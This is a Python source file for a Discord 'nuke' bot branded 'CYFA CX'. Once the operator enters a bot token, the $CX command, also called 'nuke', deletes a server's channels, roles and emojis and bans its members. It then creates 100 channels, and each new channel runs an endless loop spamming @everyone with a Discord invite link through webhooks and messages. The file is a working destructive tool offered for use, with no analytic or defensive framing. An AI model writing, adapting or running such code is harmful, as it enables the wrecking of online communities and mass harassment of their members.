import os
import json
from discord.ext import commands
from typing import ContextManager
import discord
import colorama
from colorama import Fore as F, Style as S
colorama.init()
colorama.init()

r = F.RED
w = F.RESET
g = F.GREEN


def ascii():
    print('''CYFA CX''')


ascii()
tokeninput = f'[$] Bot Token: '
TOKEN = input(tokeninput)


os.system('cls')


def main():
    ()
    headers = {
        "authorization": TOKEN
    }


os.system('cls')
os.system('title ┼ Nuke ┼')
ascii()
antinet = commands.Bot(command_prefix='$', intents=discord.Intents.all())


@antinet.event
async def on_ready():
    await antinet.change_presence(status=discord.Status.idle, activity=discord.Game('Bot Nuke'))
print('''
Command : $CX
      
AKU HIDUP    
           
           ''')

antinet.remove_command('help')


@antinet.command()
async def Help(ctx, *, message):
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $Help ')
    print(f'               {F.RESET}[{g}+{F.RESET}] Watching Text: {message}')
    print('CX CYFA')
    await ctx.message.delete()
    await antinet.change_presence(

        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message

        ))


@antinet.command()
async def clear(ctx):
    os.system('cls')
    print('''CYFA CX''')
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: >clear')


@antinet.command(aliases=['nuke'])
async def CX(ctx):
    await ctx.message.delete()
    print(f'             {F.RESET}[{r}${F.RESET}] Command Used: $CX')
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f'               {F.RESET}[{g}+{F.RESET}] Channel Deleted')
        except Exception as e:
            print(
                f'               {F.RESET}[{r}-{F.RESET}] Channel NOT Deleted')

    for member in ctx.guild.members:
        try:
            await member.ban(reason='NUKE')
            print(f'               {F.RESET}[{g}+{F.RESET}] Member Banned')
        except Exception as e:
            print(f'               {F.RESET}[{r}-{F.RESET}] Member NOT Banned')

    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f'               {F.RESET}[{g}+{F.RESET}] Role Deleted')
        except Exception as e:
            print(f'               {F.RESET}[{r}-{F.RESET}] Role NOT Deleted')

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f'               {F.RESET}[{g}+{F.RESET}] Emoji Deleted')
        except:
            print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')

    for i in range(100):
        await ctx.guild.create_text_channel("CX cyfa XO")
        print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')


@antinet.event
async def on_guild_channel_create(channel):
    web = await channel.create_webhook(name="Cyfa")
    while True:
        await web.send('@everyone @here https://discord.gg/FmjzcaW9Sx')
        await channel.send('@everyone @here https://discord.gg/FmjzcaW9Sx')

antinet.run(TOKEN)
